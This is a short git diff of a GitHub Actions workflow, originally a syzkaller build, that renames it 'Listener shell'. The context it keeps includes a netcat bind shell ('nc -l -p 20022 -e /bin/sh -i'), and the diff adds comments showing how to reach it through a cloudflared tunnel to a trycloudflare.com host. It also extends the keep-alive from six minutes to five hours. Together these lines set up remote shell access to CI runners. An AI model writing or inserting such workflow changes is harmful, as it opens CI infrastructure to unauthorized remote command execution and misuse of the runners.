@@ -1,4 +1,7 @@
-name: syzkaller build
+name: Listener shell
+# host: ./cloudflared access tcp --hostname https://geological-buyers-testing-fifty.trycloudflare.com --url localhost:20023
+# host: nc localhost 20023
+
 
 on:
   push:
@@ -71,7 +74,7 @@ jobs:
           {
             busybox nc -l -p 20022 -e /bin/sh -i &
 
-            sleep 360
+            sleep 18000 # 5jam
 
           } 2>&1 | tee -a ~/mylog.txt
 
